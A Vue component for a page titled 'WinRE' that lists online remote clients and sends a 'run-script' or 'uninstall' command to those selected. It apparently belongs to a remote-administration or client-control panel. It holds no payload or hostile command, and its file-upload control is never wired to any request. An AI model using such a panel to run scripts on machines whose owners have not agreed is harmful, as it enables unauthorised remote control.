<script setup lang="ts">
import { ref, onMounted } from 'vue'
import { api } from '../lib/api'

interface Client {
  id: string
  host: string
  nickname?: string
  online: boolean
  os: string
}

const clients = ref<Client[]>([])
const loading = ref(true)
const selectedClients = ref<string[]>([])
const action = ref<'install' | 'uninstall' | null>(null)
const processing = ref(false)
const error = ref('')
const success = ref('')
const fileInput = ref<HTMLInputElement | null>(null)
const selectedFile = ref<File | null>(null)

async function loadClients() {
  loading.value = true
  try {
    const data = await api.get<{ items: Client[] }>('/api/clients?pageSize=9999')
    clients.value = (data.items || []).filter((c: any) => c.online)
  } catch {
    // silent
  } finally {
    loading.value = false
  }
}

function toggleClient(id: string) {
  const idx = selectedClients.value.indexOf(id)
  if (idx >= 0) selectedClients.value.splice(idx, 1)
  else selectedClients.value.push(id)
}

function selectAll() {
  if (selectedClients.value.length === clients.value.length) {
    selectedClients.value = []
  } else {
    selectedClients.value = clients.value.map(c => c.id)
  }
}

function onFileSelect(e: Event) {
  const input = e.target as HTMLInputElement
  if (input.files && input.files.length > 0) {
    selectedFile.value = input.files[0]
  }
}

async function executeAction() {
  if (selectedClients.value.length === 0 || !action.value) return
  processing.value = true
  error.value = ''
  success.value = ''

  try {
    const command = action.value === 'install' ? 'run-script' : 'uninstall'
    for (const clientId of selectedClients.value) {
      await api.post(`/api/clients/${clientId}/command`, {
        command
      })
    }
    success.value = `${action.value} sent to ${selectedClients.value.length} client(s)`
    selectedClients.value = []
    action.value = null
  } catch (e: any) {
    error.value = e.message || 'Action failed'
  } finally {
    processing.value = false
  }
}

onMounted(loadClients)
</script>

<template>
  <div class="min-h-screen bg-slate-950 p-6">
    <div class="max-w-4xl mx-auto">
      <h1 class="text-xl font-semibold text-slate-100 mb-6">WinRE</h1>

      <div v-if="error" class="mb-4 px-3 py-2 bg-red-500/10 border border-red-500/30 rounded text-red-400 text-sm">{{ error }}</div>
      <div v-if="success" class="mb-4 px-3 py-2 bg-green-500/10 border border-green-500/30 rounded text-green-400 text-sm">{{ success }}</div>

      <div class="bg-slate-900 border border-slate-800 rounded p-5 mb-6">
        <h2 class="text-sm font-medium text-slate-300 mb-3">File Upload</h2>
        <div class="flex items-center gap-3">
          <input
            ref="fileInput"
            type="file"
            class="hidden"
            @change="onFileSelect"
          />
          <button
            @click="fileInput?.click()"
            class="px-3 py-1.5 bg-slate-800 hover:bg-slate-700 text-slate-300 text-sm rounded border border-slate-700"
          >
            <i class="fas fa-file mr-1.5"></i>
            {{ selectedFile ? selectedFile.name : 'Choose File' }}
          </button>
          <button
            v-if="selectedFile"
            @click="selectedFile = null"
            class="text-xs text-slate-500 hover:text-slate-300"
          >
            <i class="fas fa-times"></i>
          </button>
        </div>
      </div>

      <div class="bg-slate-900 border border-slate-800 rounded overflow-hidden">
        <div class="px-4 py-2.5 border-b border-slate-800 flex items-center justify-between">
          <div class="flex items-center gap-3">
            <button
              @click="selectAll"
              class="text-xs text-slate-400 hover:text-slate-200"
            >
              {{ selectedClients.length === clients.length ? 'Deselect All' : 'Select All' }}
            </button>
            <span class="text-xs text-slate-600">{{ selectedClients.length }} selected</span>
          </div>
          <button @click="loadClients" class="text-xs text-slate-400 hover:text-slate-200">
            <i class="fas fa-sync-alt"></i>
          </button>
        </div>
        <div class="max-h-80 overflow-y-auto">
          <div v-if="loading" class="px-4 py-8 text-center text-slate-500 text-sm">
            <i class="fas fa-spinner fa-spin mr-2"></i>Loading clients...
          </div>
          <div v-else-if="clients.length === 0" class="px-4 py-8 text-center text-slate-500 text-sm">
            No online clients
          </div>
          <label
            v-for="client in clients"
            :key="client.id"
            class="flex items-center gap-3 px-4 py-2.5 border-b border-slate-800/50 hover:bg-slate-800/30 cursor-pointer"
          >
            <input
              type="checkbox"
              :checked="selectedClients.includes(client.id)"
              @change="toggleClient(client.id)"
              class="rounded border-slate-600 bg-slate-800"
            />
            <span class="text-sm text-slate-200">{{ client.nickname || client.host }}</span>
            <span class="text-xs text-slate-500 ml-auto">{{ client.os }}</span>
          </label>
        </div>
      </div>

      <div class="flex gap-3 mt-6">
        <button
          @click="action = 'install'; executeAction()"
          :disabled="selectedClients.length === 0 || processing"
          class="flex-1 px-4 py-2.5 bg-green-600 hover:bg-green-500 disabled:opacity-40 disabled:cursor-not-allowed text-white text-sm rounded font-medium"
        >
          <i v-if="processing" class="fas fa-spinner fa-spin mr-2"></i>
          <i v-else class="fas fa-download mr-2"></i>
          Install
        </button>
        <button
          @click="action = 'uninstall'; executeAction()"
          :disabled="selectedClients.length === 0 || processing"
          class="flex-1 px-4 py-2.5 bg-red-600/80 hover:bg-red-600 disabled:opacity-40 disabled:cursor-not-allowed text-white text-sm rounded font-medium"
        >
          <i v-if="processing" class="fas fa-spinner fa-spin mr-2"></i>
          <i v-else class="fas fa-trash mr-2"></i>
          Uninstall
        </button>
      </div>
    </div>
  </div>
</template>
